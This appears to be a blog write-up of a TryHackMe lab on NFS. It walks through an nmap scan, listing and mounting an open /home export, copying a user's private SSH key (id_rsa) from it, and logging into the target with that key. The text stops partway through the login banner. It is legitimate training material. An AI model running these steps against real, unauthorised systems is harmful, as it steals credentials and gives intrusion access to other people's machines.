<!doctype html>
<html lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="shortcut icon" href="/images/favicon.png" />

<title>[THM] Network Services 2&nbsp;|&nbsp;Wook&#39;s blog</title>
<meta
  name="title"
  content="[THM] Network Services 2"
/>
<meta
  name="description"
  content="This is the second series on Network Services in the Network Exploitation Basics module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.
NFS

Understanding NFS
What does NFS stand for?






Network File System

What process allows an NFS client to interact with a remote directory as though it was a physical drive?






Mounting
By using NFS, users and programs can access files on remote systems as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file."
/>
<meta
  name="keywords"
  content="TryHackMe,"
/>

  <meta name="author" content="Wook Lee" />




<meta property="og:url" content="http://localhost:1313/thm-network-services-2/">
  <meta property="og:site_name" content="Wook&#39;s blog">
  <meta property="og:title" content="[THM] Network Services 2">
  <meta property="og:description" content="This is the second series on Network Services in the Network Exploitation Basics module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.
NFS Understanding NFS What does NFS stand for?
Network File System What process allows an NFS client to interact with a remote directory as though it was a physical drive?
Mounting By using NFS, users and programs can access files on remote systems as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="blog">
    <meta property="article:published_time" content="2024-06-26T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-06-26T00:00:00+00:00">
    <meta property="article:tag" content="TryHackMe">





  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="[THM] Network Services 2">
  <meta name="twitter:description" content="This is the second series on Network Services in the Network Exploitation Basics module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.
NFS Understanding NFS What does NFS stand for?
Network File System What process allows an NFS client to interact with a remote directory as though it was a physical drive?
Mounting By using NFS, users and programs can access files on remote systems as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.">





  <meta itemprop="name" content="[THM] Network Services 2">
  <meta itemprop="description" content="This is the second series on Network Services in the Network Exploitation Basics module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.
NFS Understanding NFS What does NFS stand for?
Network File System What process allows an NFS client to interact with a remote directory as though it was a physical drive?
Mounting By using NFS, users and programs can access files on remote systems as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.">
  <meta itemprop="datePublished" content="2024-06-26T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-06-26T00:00:00+00:00">
  <meta itemprop="wordCount" content="5241">
  <meta itemprop="keywords" content="TryHackMe">
<meta name="referrer" content="no-referrer-when-downgrade" />

    
    <link href="/simple.min.css" rel="stylesheet" />

    
    <link href="/style.min.css" rel="stylesheet" />

    

    
</head>

  <body>
    <header>
      <nav>
  <a
    href="/"
    
    >Home</a
  >

  <a
    href="/blog/"
    
    >Blog</a
  >


  <a href="/index.xml">
    <svg xmlns="http://www.w3.org/2000/svg" class="icon" viewBox="0 0 448 512">
      
      <path
        d="M0 64C0 46.3 14.3 32 32 32c229.8 0 416 186.2 416 416c0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96C14.3 96 0 81.7 0 64zM0 416a64 64 0 1 1 128 0A64 64 0 1 1 0 416zM32 160c159.1 0 288 128.9 288 288c0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224c-17.7 0-32-14.3-32-32s14.3-32 32-32z"
      />
    </svg>
    RSS
  </a>

</nav>

<h1>[THM] Network Services 2</h1>


    </header>
    <main>
      
  
    
      
      <p>
        <i>
          <time datetime="2024-06-26" pubdate>
            2024-06-26
          </time>
        </i>
      </p>
    
  
  
  <content>
    <p>This is the second series on Network Services in the <code>Network Exploitation Basics</code> module of the Complete Beginner path. I really learned a lot and a lot of new protocols and tools were introduced.</p>
<h3 id="nfs">NFS</h3>
<hr>
<h4 id="understanding-nfs">Understanding NFS</h4>
<p>What does NFS stand for?</p>






<pre tabindex="0"><code>Network File System</code></pre>
<br>
<p>What process allows an NFS client to interact with a remote directory as though it was a physical drive?</p>






<pre tabindex="0"><code>Mounting</code></pre>
<p>By using NFS, users and programs can access files on remote systems as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.</p>
<br>
<p>What does NFS use to represent files and directories on the server?</p>






<pre tabindex="0"><code>file handle</code></pre>
<p>The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.
<br>
<br></p>
<p>What protocol does NFS use to communicate between the server and client?</p>






<pre tabindex="0"><code>RPC</code></pre>
<br>
<p>What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1/parameter 2</p>






<pre tabindex="0"><code>user id / group id</code></pre>
<br>
<p>Can a Windows NFS server share files with a Linux client? (Y/N)</p>






<pre tabindex="0"><code>Y</code></pre>
<br>
<p>Can a Linux NFS server share files with a MacOS client? (Y/N)</p>






<pre tabindex="0"><code>Y</code></pre>
<p>Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or Unix.
A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows server to access files stored on a non-Windows NFS server.
<br>
<br></p>
<p>What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.</p>






<pre tabindex="0"><code>4.2</code></pre>
<br>
<h4 id="enumerating-nfs">Enumerating NFS</h4>
<h5 id="requirements">Requirements</h5>
<p>In order to do a more advanced enumeration of the NFS server, and shares – we&rsquo;re going to need a few tools.</p>
<ol>
<li>
<p>NFS-Common</p>
<p>It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. Primarily, we are concerned with &ldquo;showmount&rdquo; and &ldquo;mount.nfs&rdquo; as these are going to be most useful to us when it comes to extracting information from the NFS share</p>
</li>
<li>
<p>Port Scanning</p>
</li>
<li>
<p>Mounting NFS shares</p>
<p>Your client&rsquo;s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create this folder anywhere on your system. Once you&rsquo;ve created this mount point, you can use the &ldquo;mount&rdquo; command to connect the NFS share to the mount point on your machine like so: <code>sudo mount -t nfs IP:share /tmp/mount/ -nolock</code></p>
<p><code>sudo</code> : run as root <br>
<code>mount</code> : execute the mount command <br>
<code>-t nfs</code> : type of device to mount, then specifying that it&rsquo;s NFS <br>
<code>IP:share</code>: the IP address of the NFS server, and the name of the share we wish to mount <br>
<code>-nolock</code>: specifies not to use NLM locking</p>
</li>
</ol>
<br>
<p>Conduct a thorough port scan of your choosing, how many ports are open?</p>






<pre tabindex="0"><code>7</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>PORT STATE SERVICE REASON VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>22/tcp open ssh syn-ack ttl <span style="color:#fab387">64</span> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>| <span style="color:#fab387">2048</span> 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 <span style="color:#89dceb;font-weight:bold">(</span>RSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEQIafB/d+8xhCVa/WJUjV/xtzU7h9fmdPMEVWEobVN59eusBnBD19rp08xrjFOkvHdLSe3XCaDSSreOd4m9If73vzGT/dpXO4kj2Je+p2ALDLLr0vbA+/EVrFJjsbKJ6OLNWGw2nD6romEld++MLOI0SbY9zaM3ov4hwQZ2Fnp9QF5OAt3zqIyxk5Xr99gpm/i4mk3YtA+3I1WHpdLE5Uw41aOVYapowLh+sG1Uyi8dxnI7WJ04DywrUftJam/ajlY6QAiWDR96QRw7RuNJ+8dOLDj7JT+aNREvSTrSWahn+clpIwCgDuVUYy36BEfyTpC/JyTtuS077Bj8vv8NLl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>| <span style="color:#fab387">256</span> 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff <span style="color:#89dceb;font-weight:bold">(</span>ECDSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIL2RAJwSBEjlVNFa6km4BnXrbfxBqanFGsc8V7KPraGwGaJkBCtaUpVRQmPXQHhNePswl4UI2rsxVLcw/DYQ4s<span style="color:#89dceb;font-weight:bold">=</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>| <span style="color:#fab387">256</span> bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e <span style="color:#89dceb;font-weight:bold">(</span>EdDSA<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINqYlGyJzySWsOMejWbc9mf3mFzerVbrty8i6PCOR7lv
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>111/tcp open rpcbind syn-ack ttl <span style="color:#fab387">64</span> 2-4 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100000)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>| rpcinfo:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>| program version port/proto service
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>| <span style="color:#fab387">100000</span> 2,3,4 111/tcp rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>| <span style="color:#fab387">100000</span> 2,3,4 111/udp rpcbind
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>| <span style="color:#fab387">100003</span> <span style="color:#fab387">3</span> 2049/udp nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>| <span style="color:#fab387">100003</span> 3,4 2049/tcp nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">17</span><span>| <span style="color:#fab387">100005</span> 1,2,3 52691/tcp mountd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">18</span><span>| <span style="color:#fab387">100005</span> 1,2,3 57133/udp mountd
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">19</span><span>| <span style="color:#fab387">100021</span> 1,3,4 34475/tcp nlockmgr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">20</span><span>| <span style="color:#fab387">100021</span> 1,3,4 48911/udp nlockmgr
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">21</span><span>| <span style="color:#fab387">100227</span> <span style="color:#fab387">3</span> 2049/tcp nfs_acl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">22</span><span>|_ <span style="color:#fab387">100227</span> <span style="color:#fab387">3</span> 2049/udp nfs_acl
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">23</span><span>2049/tcp open nfs_acl syn-ack ttl <span style="color:#fab387">64</span> <span style="color:#fab387">3</span> <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100227)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">24</span><span>34475/tcp open nlockmgr syn-ack ttl <span style="color:#fab387">64</span> 1-4 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100021)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">25</span><span>46359/tcp open mountd syn-ack ttl <span style="color:#fab387">64</span> 1-3 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100005)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">26</span><span>52691/tcp open mountd syn-ack ttl <span style="color:#fab387">64</span> 1-3 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100005)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">27</span><span>56583/tcp open mountd syn-ack ttl <span style="color:#fab387">64</span> 1-3 <span style="color:#89dceb;font-weight:bold">(</span>RPC <span style="color:#6c7086;font-style:italic">#100005)</span></span></span></code></pre></div>
<br>
<p>Which port contains the service we&rsquo;re looking to enumerate?</p>






<pre tabindex="0"><code>2049</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>| <span style="color:#fab387">100003</span> <span style="color:#fab387">3</span> 2049/udp nfs
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>| <span style="color:#fab387">100003</span> 3,4 2049/tcp nfs</span></span></code></pre></div>
<br>
<p>Now, use <code>/usr/sbin/showmount -e [IP]</code> to list the NFS shares, what is the name of the visible share?</p>






<pre tabindex="0"><code>/home</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-87-146:~# /usr/sbin/showmount -e 10.10.14.167
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>Export list <span style="color:#cba6f7">for</span> 10.10.14.167:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>/home <span style="color:#89b4fa">\*</span></span></span></code></pre></div>
<br>
Time to mount the share to our local machine!
<p>First, use <code>mkdir /tmp/mount</code> to create a directory on your machine to mount the share to. This is in the /tmp directory - so be aware that it will be removed on restart.</p>
<p>Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share – what is the name of the folder inside?</p>






<pre tabindex="0"><code>cappucino</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-87-146:~# mkdir /tmp/mount
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root@ip-10-10-87-146:~# sudo mount -t nfs 10.10.14.167:home /tmp/mount/ -nolock
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>root@ip-10-10-87-146:~# <span style="color:#89dceb">cd</span> /tmp/mount
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>root@ip-10-10-87-146:/tmp/mount# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>cappucino</span></span></code></pre></div>
<br>
<p>Have a look inside the directory, look at the files. Looks like we&rsquo;re inside a user&rsquo;s home directory&hellip;</p>
<p>Interesting! Let&rsquo;s do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?</p>






<pre tabindex="0"><code>.ssh</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-87-146:/tmp/mount/cappucino# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>root@ip-10-10-87-146:/tmp/mount/cappucino# ls -al
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>total <span style="color:#fab387">36</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>drwxr-xr-x <span style="color:#fab387">5</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Jun <span style="color:#fab387">4</span> <span style="color:#fab387">2020</span> .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>drwxr-xr-x <span style="color:#fab387">3</span> root root <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">21</span> <span style="color:#fab387">2020</span> ..
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>-rw------- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">5</span> Jun <span style="color:#fab387">4</span> <span style="color:#fab387">2020</span> .bash_history
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">220</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bash_logout
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">3771</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .bashrc
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .cache
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>drwx------ <span style="color:#fab387">3</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .gnupg
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">807</span> Apr <span style="color:#fab387">4</span> <span style="color:#fab387">2018</span> .profile
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>drwx------ <span style="color:#fab387">2</span> ubuntu ubuntu <span style="color:#fab387">4096</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>-rw-r--r-- <span style="color:#fab387">1</span> ubuntu ubuntu <span style="color:#fab387">0</span> Apr <span style="color:#fab387">22</span> <span style="color:#fab387">2020</span> .sudo_as_admin_successful</span></span></code></pre></div>
<br>
<p>Which of these keys is most useful to us?</p>






<pre tabindex="0"><code>id_rsa</code></pre>
<p><code>id_rsa</code> is the default name of an SSH identity file.</p>
<br>
<p>Copy this file to a different location your local machine, and change the permission to &ldquo;600&rdquo; using <code>chmod 600 [file]</code>.</p>
<p>Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.</p>
<p>Can we log into the machine using <code>ssh -i &lt;key-file&gt; &lt;username&gt;@\&lt;ip&gt; ?</code> (Y/N).</p>






<pre tabindex="0"><code>Y</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-233-18:~# cp /tmp/mount/cappucino/.ssh/id_rsa ~
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>root@ip-10-10-233-18:~# ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>burp.json Desktop id_rsa Pictures Rooms thinclient_drives
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>CTFBuilder Downloads Instructions Postman Scripts Tools
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>root@ip-10-10-233-18:~# chmod <span style="color:#fab387">600</span> id_rsa
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>root@ip-10-10-233-18:~# ssh -i id_rsa cappucino@10.10.14.167</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>Welcome to Ubuntu 18.04.4 LTS <span style="color:#89dceb;font-weight:bold">(</span>GNU/Linux 4.15.0-101-generic x86_64<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>- Documentation: https://help.ubuntu.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>- Management: https://landscape.canonical.com
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>- Support: https://ubuntu.com/advantage
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>System information as of Tue Jun <span style="color:#fab387">25</span> 05:47:40 UTC <span style="color:#fab387">2024</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>System load: 0.0 Processes: <span style="color:#fab387">102</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>Usage of /: 45.2% of 9.78GB Users logged in: <span style="color:#fab387">0</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>Memory usage: 16% IP address <span style="color:#cba6f7">for</span> eth0: 10.10.14.167
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Swap usage: 0%
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span><span style="color:#fab387">44</span> packages can be updated.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span><span style="color:#fab387">0</span> updates are security updates.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">16</span><span>
